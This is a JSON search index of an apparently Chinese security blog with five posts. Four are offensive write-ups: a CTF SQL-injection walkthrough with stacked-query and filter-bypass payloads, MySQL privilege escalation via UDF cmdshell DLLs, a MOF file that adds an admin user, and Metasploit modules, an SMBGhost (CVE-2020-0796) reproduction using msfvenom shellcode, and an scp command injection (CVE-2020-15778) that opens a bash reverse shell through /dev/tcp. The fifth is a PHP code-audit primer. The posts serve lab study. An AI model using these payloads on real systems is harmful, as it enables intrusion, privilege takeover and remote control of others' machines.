{"meta":{"title":"Sheng 's blog","subtitle":"Sheng","description":"","author":"Sheng","url":"https://ms12020.github.io","root":"/"},"pages":[{"title":"404","date":"2020-05-29T16:00:00.000Z","updated":"2021-04-10T11:08:39.449Z","comments":true,"path":"404/index.html","permalink":"https://ms12020.github.io/404/index.html","excerpt":"","text":""},{"title":"about","date":"2018-09-30T09:25:30.000Z","updated":"2021-04-10T11:06:54.282Z","comments":true,"path":"about/index.html","permalink":"https://ms12020.github.io/about/index.html","excerpt":"","text":""},{"title":"categories","date":"2018-09-30T09:25:30.000Z","updated":"2021-04-10T11:06:13.530Z","comments":true,"path":"categories/index.html","permalink":"https://ms12020.github.io/categories/index.html","excerpt":"","text":""},{"title":"contact","date":"2018-09-30T09:25:30.000Z","updated":"2021-04-10T12:22:13.221Z","comments":true,"path":"contact/index.html","permalink":"https://ms12020.github.io/contact/index.html","excerpt":"","text":"留言板尚未开放，想要留言可加作者QQ并进行联系。"},{"title":"friends","date":"2018-12-12T13:25:30.000Z","updated":"2021-04-10T11:07:39.931Z","comments":true,"path":"friends/index.html","permalink":"https://ms12020.github.io/friends/index.html","excerpt":"","text":""},{"title":"tags","date":"2018-09-10T10:23:38.000Z","updated":"2021-04-10T11:06:34.186Z","comments":true,"path":"tags/index.html","permalink":"https://ms12020.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"2019强网杯 随便注","slug":"[强网杯 2019]随便注","date":"2021-04-25T06:29:54.585Z","updated":"2021-04-25T06:31:54.450Z","comments":true,"path":"2021/04/25/[强网杯 2019]随便注/","link":"","permalink":"https://ms12020.github.io/2021/04/25/[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8/","excerpt":"","text":"[2019 强网杯]随便注访问题目站点，随便输入就能看到返回结果 输入&#39;测试是否存在注入点 发现报错，可以猜测此注入为字符型注入 构造SQL语句返回能查看的所有值 1' or 1=1# 爆出所在表字段数 1' order by 2# //正常回显 1' order by 3# //出现报错 证明有2个字段 尝试爆所在数据库 1' union select database(),user()# 返回了一串代码，说明select函数被过滤 那么select union查询就无法使用了 堆栈注入堆叠注入(堆叠查询，Stacked Queries) 堆叠注入为攻击者提供了很多控制权，与仅限于SELECT语句的UNION联合查询攻击不同，堆叠注入可以用于执行任何SQL语句。 堆叠注入原理在SQL中，分号表示一条语句的结束。如果在分号的后面再加一条语句，这条语句也可以被执行，继续加一个分号和一条语句，这样就可以在一次数据库的调用中执行多个语句。 堆叠注入的局限性堆叠注入并不是在每种情况下都能使用的。大多数时候，因为API或数据库引擎的不支持，堆叠注入都无法实现。 查看所有数据库 -1';show databases;# 查看当前数据库下的所有表 1';show tables;# 查看表结构 -1';desc `1919810931114514`;desc `words`# 在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符 发现flag在1919810931114514表里 判断出查询语句 selsect id,data from words where id = ? payload0';rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc words;# 由于可以堆叠查询，这时候就想到了一个改名的方法 把words随便改成words1，然后把1919810931114514改成words，再把列名flag改成id，结合上面的1’ or 1=1#爆出表所有内容就可以查flag啦 1&#39;or 1=1#爆出表所有内容 预处理语句PREPARE name from '[mysql sequece]'; //预定义SQL语句 EXECUTE name; //执行预定义SQL语句 (DEALLOCATE || DROP) PREPARE name; //删除预定义SQL 语句 预定义语句也可以通过变量进行传递 SET @tn = 'hahaha'; //存储表名 SET @sql = concat('select * from ', @tn); //存储SQL语句 PREPARE name from @sql; //预定义SQL语句 EXECUTE name; //执行预定义SQL语句 (DEALLOCATE || DROP) PREPARE sqla; //删除预定义SQL语句 payload利用 char() 函数将select的ASCII码转换为select字符串，接着利用concat()函数进行拼接得到select查询语句，从而绕过过滤。或者直接用concat()函数拼接select来绕过。 不使用变量 1';PREPARE hacker from concat(char(115,101,108,101,99,116), ' * from `1919810931114514` ');EXECUTE hacker;# 使用变量 1';SET @sqli=concat(char(115,101,108,101,99,116),'* from `1919810931114514`');PREPARE hacker from @sqli;EXECUTE hacker;# 只是用contact(),不使用char() 1';PREPARE hacker from concat('s','elect', ' * from `1919810931114514` ');EXECUTE hacker;# 参考文档MySQL中concat函数 Mysql修改字段名、修改字段类型","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://ms12020.github.io/tags/CTF/"}]},{"title":"MySQL提权","slug":"MySQL提权","date":"2021-04-11T06:26:42.924Z","updated":"2021-04-11T06:33:00.826Z","comments":true,"path":"2021/04/11/MySQL提权/","link":"","permalink":"https://ms12020.github.io/2021/04/11/MySQL%E6%8F%90%E6%9D%83/","excerpt":"","text":"MySQL提权 流程：服务探针——信息收集——提权利用——获取权限 提权前提：获取数据库最高管理员的账户密码 读取网站数据库配置文件（了解其命名规则及查找技巧） sql、data、inc、config、conn、database、common、include 读取数据库存储或备份文件（了解数据库存储格式及对应内容） @@basedir/data/数据库名/表名.MYD (表内容) 暴力破解（了解数据库是否支持外联及如何开启外联） UDF提权利用root权限，创建带有调用cmd函数的udf.dll(动态链接库)。当我们把udf.dll导出指定文件夹引入MySQL时，其中的调用函数拿出来当作MySQL的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，MySQL账号转化为system权限，从而来提权。 MySQL &lt; 5.1 udf.dll文件在Windows2003下放置于c:\\windows\\system32，在windows2000下放置于c:\\winnt\\system32。 MySQL =&gt; 5.1 udf.dll文件必须放置于MYSQL安装目录下的lib\\plugin文件夹下。 查看数据库服务版本信息 select @@version; select version(); 查看数据库安装目录 select @@basedir; select basedir(); 查看MySQL安装路径 show variables like '%plugins%'; 利用NTFS ADS创建lib目录 select 'x' into dumpfile '安装目录\\\\lib::$INDEX_ALLOCATION'; 利用NTFS ADS创建plugin目录 select 'x' into dumpfile '安装目录\\\\lib\\\\plugin::$INDEX_ALLOCATION'; UDF提权文件所在位置 msf的UDF文件原C++函数没有写异常处理，那么MySQL加载的时候会使MySQL出错导致断开连接。 metasploit下的动态链接库 sqlmap下的动态链接库 sqlmap下的4个UDF文件是经过编码的，如果直接丢在MySQL的plugin目录下是无法加载的，需要用sqlmap/extra/cloak/cloak.py进行解码 python .\\cloak.py -d -i ..\\..\\data\\udf\\mysql\\windows\\64\\lib_mysqludf_sys.dll_ -o lib_mysqludf_sys.dll 导出dll到指定目录 可以使用msf中mysql_udf_payload模块 条件： secure_auth=YES (运行导出文件) secure_file_prive=空 (可以导出任意文件到任意位置) 查看是否允许文件导出导入 show variables like \"%secure%\"; 导出dll select 'lib_mysqludf_sys.dll' into outfile '安装目录/lib/pulgin/udf.dll'; 创建cmdshell 函数 (该函数叫什么名字在后续中则使用该函数进行查询) create function cmdshell returns string soname 'udf.dll'; # [AGGREATE]是聚集函数的表示，系统定义的聚集函数比如有COUNT()、AVE()、MN()、MAX()、SUM() # SONAME 'file'表示这个函数从哪个文件里面引入，而这个文件一般是动态链接库，windows下是dll，linux是so，并且这个文件要在mysql的plugin目录下 执行命令 select cmdshell('whoami'); # 关闭windows防火墙和筛选 select cmdshell('net stop policyagent'); select cmdshell('net stop sharedaccess'); select cmdshell('netsh advfirewall set allprofiles state off'); udf.dll下常见函数 cmdshell //执行cmd; downloader //下载者,到网上下载指定文件并保存到指定目录; open3389 //通用开3389终端服务,可指定端口(不改端口无需重启); backshell //反弹Shell; ProcessView //枚举系统进程; KillProcess //终止指定进程; regread //读注册表; regwrite //写注册表; shut //关机,注销,重启; about //说明与帮助函数; MOF提权MOF是windows系统的一个文件（在c:/windows/system32/wbem/mof/nullevt.mof）叫做托管对象格式其作用是每隔五秒就会去监控进程创建和死亡。 其实就是用了MySQL的root权限了以后，然后使用root权限去执行我们上传的MOF。隔了一定时间以后这个MOF就会被执行，这个MOF当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。 MOF提权过程: 将MOF上传至任意可读可写目录下 更改MOF文件代码 #pragma namespace(\"\\\\\\\\.\\\\root\\\\subscription\") instance of __EventFilter as $EventFilter &#123; EventNamespace = \"Root\\\\Cimv2\"; Name = \"filtP2\"; Query = \"Select * From __InstanceModificationEvent \" \"Where TargetInstance Isa \\\"Win32_LocalTime\\\" \" \"And TargetInstance.Second = 5\"; QueryLanguage = \"WQL\"; &#125;; instance of ActiveScriptEventConsumer as $Consumer &#123; Name = \"consPCSV2\"; ScriptingEngine = \"JScript\"; ScriptText = \"var WSH = new ActiveXObject(\\\"WScript.Shell\\\")\\nWSH.run(\\\"net.exe user admin admin /add\\\")\"; &#125;; instance of __FilterToConsumerBinding &#123; Consumer = $Consumer; Filter = $EventFilter; &#125;; 使用SQL语句将系统当中默认的nullevt.mof给替换掉 select load_file('D:\\wamp\\xishaonian.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof'; MSF进行MOF提权 Msf下的exploit/windows/mysql/mysql_mof模块提供了直接MOF提权，不过该漏洞成功跟操作系统权限和MySQL数据库版本有关，执行成功后会直接反弹shell到meterpreter。 use exploit/windows/mysql/mysql_mof set rhost IP //设置需要提权的远程主机IP地址 set rport 3306 //设置mysql的远程端口 set password root //设置mysql数据库root密码 set username root //设置mysql用户名 show options //查看设置 exploit MySQL允许远程root登入 一: use mysql; update user set host = '%' where user = 'root'; FLUSH PRIVILEGES ; 二: GRANT ALL PRIVILEGES ON . TO 'root'@'%' IDENTIFIED BY 'youpassword' WITH GRANT OPTION; FLUSH PRIVILEGES; 启动项提权 导出自定义可执行文件到启动目录配合重启执行 将创建好的后门或执行文件进行服务器启动项写入,配合重启执行 MSF进行启动项提权 use exploit/windows/mysql/mysql_start_up set rhost IP //设置需要提权的远程主机IP地址 set rport 3306 //设置mysql的远程端口 set password root //设置mysql数据库root密码 set username root //设置mysql用户名 show options //查看设置 exploit Windows下三种MySQL提权剖析 MySQL数据库渗透及漏洞利用总结 mof提权原理及其过程","categories":[],"tags":[{"name":"MySQL","slug":"MySQL","permalink":"https://ms12020.github.io/tags/MySQL/"},{"name":"提权","slug":"提权","permalink":"https://ms12020.github.io/tags/%E6%8F%90%E6%9D%83/"}]},{"title":"CVE-2020-0796（永恒之黑)漏洞复现","slug":"CVE_2020_0796(永恒之黑)漏洞复现","date":"2021-04-10T12:43:29.473Z","updated":"2021-04-11T06:34:10.184Z","comments":true,"path":"2021/04/10/CVE_2020_0796(永恒之黑)漏洞复现/","link":"","permalink":"https://ms12020.github.io/2021/04/10/CVE_2020_0796(%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"CVE-2020-0796（永恒之黑)漏洞原理 SMB远程代码执行漏洞 SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无需权限即可实现远程代码执行，受黑客攻击的目标系统只需要开机在线就有可能被入侵 Windows 10和Windows Server 2016引入了SMB 3.1.1，本次漏洞源于SMBv3没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压时，并没有检查长度是否合法，最终导致整数溢出 利用该漏洞，黑客可直接远程攻击SMB服务端远程执行恶意代码，也可以通过构建恶意SMB服务端诱导客户端连接从而大规模攻击客户端 影响版本Windows 10 Version 1903 for 32-bit Systems Windows 10 Version 1903 for x64-based Systems Windows 10 Version 1903 for ARM64-based Systems Windows Server, Version 1903 (Server Core installation) Windows 10 Version 1909 for 32-bit Systems Windows 10 Version 1909 for x64-based Systems Windows 10 Version 1909 for ARM64-based Systems Windows Server, Version 1909 (Server Core installation) 漏洞复现工具下载 漏洞检测工具：http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip 攻击poc：https://github.com/eerykitty/CVE-2020-0796-PoC shell脚本：https://github.com/chompie1337/SMBGhost_RCE_PoC 蓝屏复现环境 目标机：Windows 10 1903 ip: 10.7.1.111（虚拟机） 攻击机：Windows 10 20H2 ip: 10.7.6.254（物理机） 将目标机的防火墙关闭 在攻击机上对目标机进行检测，看其是否存在漏洞。 利用下载的poc脚本发起攻击 反弹shell环境 目标机：Windows 10 1903 ip: 10.7.1.111（虚拟机） 攻击机：Windows 10 20H2 ip: 10.7.6.254（物理机） 生成一个反弹木马 msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=8888 -b '\\x00' -i 1 -f python 说明: #-p payload #-e 编码方式 #-i 编码次数 #-b 过滤坏字符 #LHOST,LPORT 监听上线的主机IP和端口 #-f python 生成python格式 #‘\\x00‘转义字符，对应ascall码中为null，因为是二进制文件所以会出现，在python中作为结束的标志，有点相当于%00截断的感觉。 用生成的shellcode将shell脚本工具里面的exploit.py中的user_payload替换掉。保留前面的名字，只替换内容 开启msf监听模块 运行exploit.py脚本，发起攻击反弹shell 这个脚本有点问题，要多试几次才能得到shell，不用着急。这个脚本有时候会把靶机打蓝屏，重启一下靶机就好了，继续执行脚本知道得到shell。","categories":[],"tags":[{"name":"复现","slug":"复现","permalink":"https://ms12020.github.io/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"Windows 10","slug":"Windows-10","permalink":"https://ms12020.github.io/tags/Windows-10/"},{"name":"SMB","slug":"SMB","permalink":"https://ms12020.github.io/tags/SMB/"}]},{"title":"CVE-2020-15778 OpenSSL漏洞复现","slug":"CVE-2020-15778(OpenSSL)漏洞复现","date":"2021-04-10T12:40:24.207Z","updated":"2021-04-11T06:33:29.417Z","comments":true,"path":"2021/04/10/CVE-2020-15778(OpenSSL)漏洞复现/","link":"","permalink":"https://ms12020.github.io/2021/04/10/CVE-2020-15778(OpenSSL)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","excerpt":"","text":"CVE-2020-15778 OpenSSL影响版本： OpenSSH &lt;= 8.3p1 漏洞介绍 漏洞公开披露2020年7月18日，openssh 8.3p1的SCP命令存在命令注入漏洞，攻击者可以利用此漏洞执行任意命令。 局限性 适用范围小，需要知道root用户密码，最大最用为ssh无法连接，但scp可以使用时 环境搭建 使用iptables策略搭建环境，禁用ssh登录，只保留scp(CentOS) 关闭自带防火墙(firewalld) 停止firewalld服务 $ systemctl stop firewalld 设置iptables策略 service iptables start iptables -t filter -A INPUT -p tcp --dport 22 -m tos --tos 0x10 -j DROP service iptables save iptables -L -n --line-number 验证 scp功能正常使用，但是ssh在输入密码后，无任何回响，无法连接，证明iptables策略成功有效。 漏洞复现在kali里面新建1.sh，写入反弹shell的bash命令 bash -i >& /dev/tcp/10.7.5.120>&1 kali监听6666端口 使用scp命令传输文件到CentOS的/tmp目录 命令执行，运行1.sh scp 1.sh root@192.168.1.135:/'`sh /tmp/1.sh`' 漏洞分析 scp命令源码 if (remin == -1) &#123; xasprintf(&bp, \"%s -t %s%s\", cmd, *targ == '-' ? \"-- \" : \"\", targ); if (do_cmd(thost, tuser, tport, bp, &remin, &remout) < 0) exit(1); if (response() < 0) exit(1); free(bp); &#125; 当执行本地scp命令时，scp不会检查、过滤和清除文件名。这使得攻击者执行带有反引号的有效scp命令时，本地shell还将执行反引号中的命令。 修复建议补丁/升级","categories":[],"tags":[{"name":"OpenSSL","slug":"OpenSSL","permalink":"https://ms12020.github.io/tags/OpenSSL/"},{"name":"复现","slug":"复现","permalink":"https://ms12020.github.io/tags/%E5%A4%8D%E7%8E%B0/"}]},{"title":"PHP代码审计基础概念","slug":"代码审计概述","date":"2021-04-10T08:42:14.704Z","updated":"2021-04-11T06:32:36.874Z","comments":true,"path":"2021/04/10/代码审计概述/","link":"","permalink":"https://ms12020.github.io/2021/04/10/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/","excerpt":"","text":"PHP代码审计工具代码编辑器 Notepad++ Visual Studio Code 代码审计工具 Seay源代码审计系统 Firtufy SCA RIPS 漏洞验证辅助 BurpSuite Community 浏览器扩展 编码转换、加密解密工具 正则调试工具 SQL执行监控工具 思路 检查铭感函数的参数，然后回溯变量，判断变量是否可控并且没有经过严格的过滤（逆向追踪） 找出哪些文件在接收外部传入的参数，然后跟踪变量的传递过程，观察是否有变量传入到高危函数中，或者传递的过程中是否有代码逻辑漏洞（正向追踪） 直接挖掘功能点漏洞，根据自身的禁言判断该类应用通常在哪些功能中会出现漏洞，直接全篇阅读该功能代码 学好代码审计需要掌握一下几点 PHP编程语言的特性和基础 Web前端编程基础 漏洞形成原理 代码审计思路 不同系统、中间件之间的特性差异 PHP核心配置​ 常见PHP_INI_*常量的定义 常量 含义 PHP_INI_USER 该配置选项可在用户的PHP脚本或Windows注册表中设置 PHP_INI_PERDIR 该配置选项可在php.ini、.htaccess或httpd.conf中设置 PHP_INI_SYSTEM 该配置选项可在php.ini或httpd.conf中配置 PHP_INI_ALL 该配置选项可在任何地方设置 php.ini.only 该配置选项可仅可在php.ini中配置 常见核心配置register_globals(全局变量注册开关) 版本：&lt;= PHP 5.3.0 在选项设置为on的情况下，会直接吧用户GET、POST等方式提交上来的参数注册成全局变量并初始化值为参数对应的值，使得提交的参数可以直接在脚本中使用 allow_url_include(是否允许包含远程文件) 版本：PHP all PHP 5.2.0之后默认为Off 类似函数：allow_url_fopen(是否打开远程文件) 在该配置为on的情况下，它可以直接远程包含文件，当存在include($var)并且$var可控的情况下，可以直接控制其来执行PHP代码 magic_quotes_gpc(魔术引号自动过滤) 版本：&lt; PHP 5.4； PHP 5.3之后不推荐使用该函数 置返回： &lt; PHP 4.2.3配置范围为PHP_INI_ALL；&gt; PHP 4.2.3配置范围为PHP_INI_PERDIR 当选项为On时，在不存在编码或者其他绕过绕过的情况下，可以使得很多漏洞无法利用，他会自动在GET、POST、COOKIE变量中的单引号&#39;&#39;、双引号&quot;&quot;、反斜杠\\以及空字符NULL的前面加上反斜杠 在PHP5中magic_quotes_gpc不会过滤$_SERVER变量，导致很多client-ip、referer一类的漏洞能够利用。 open_basedir(PHP可访问目录) 版本：PHP ALL 范围：&lt; PHP 5.2.3配置范围为PHP_INI_SYSTEM；&gt; PHP 5.2.3配置范围PHP_INI_ALL open_basedir指令用来限制PHP只能访问哪些目录，通常只需要设置Web文件目录即可，如果需要加载其他外部脚本，也需要吧脚本所在的目录路径加入到open_basedir指令中，多个目录用分号(;)分隔 # `open_basedir`指定的实际上时前缀，而不是目录名 open_basedir=/www/a # 设定可访问的目录为/www下以a开头的文件，也就是说/www/a和/www/ab都可以被访问 open_basedir=/www/a/ # 设置只能访问/www/a文件 当open_basedir配置目录后，执行脚本访问其他函数都需要验证文件是否符合配置要求，因此会影响效率 disable_functions(禁用函数) 版本：PHP ALL 范围：该指令的配置范围为php.ini only 在正式生产环境中，为了更安全地允许PHP，也可以使用disable_functions指令来禁止一些敏感函数的使用。当你使用该指令禁用危险函数时，切记将dl()函数加到禁止列表中，因为攻击者可以利用dl()函数来加载自定义的PHP扩展以突破disable_functions的限定 # 多个函数之间用逗号（,）分隔 disable_functions=phpinfo,eval,passthru,exec,system,dl disable_errors和error_reporting(错误显示) 版本：PHP ALL 配置范围：PHP_INI_ALL disable_errors表明是否显示PHP脚本内部的错误，在调试时通常将PHP错误显示打开，但是在生产环境中，建议关闭PHP错误回显。 为了避免一些安全隐患，在设置disable_errors=On时，还可以配置error_reporting，这个选项用来配置错误显示的级别，可使用数字也可使用内置常量配置。 ​ 数字格式与变量格式的详细信息 ​ 常用指令及说明","categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://ms12020.github.io/tags/PHP/"},{"name":"代码审计","slug":"代码审计","permalink":"https://ms12020.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]}],"categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://ms12020.github.io/tags/CTF/"},{"name":"MySQL","slug":"MySQL","permalink":"https://ms12020.github.io/tags/MySQL/"},{"name":"提权","slug":"提权","permalink":"https://ms12020.github.io/tags/%E6%8F%90%E6%9D%83/"},{"name":"复现","slug":"复现","permalink":"https://ms12020.github.io/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"Windows 10","slug":"Windows-10","permalink":"https://ms12020.github.io/tags/Windows-10/"},{"name":"SMB","slug":"SMB","permalink":"https://ms12020.github.io/tags/SMB/"},{"name":"OpenSSL","slug":"OpenSSL","permalink":"https://ms12020.github.io/tags/OpenSSL/"},{"name":"PHP","slug":"PHP","permalink":"https://ms12020.github.io/tags/PHP/"},{"name":"代码审计","slug":"代码审计","permalink":"https://ms12020.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}]}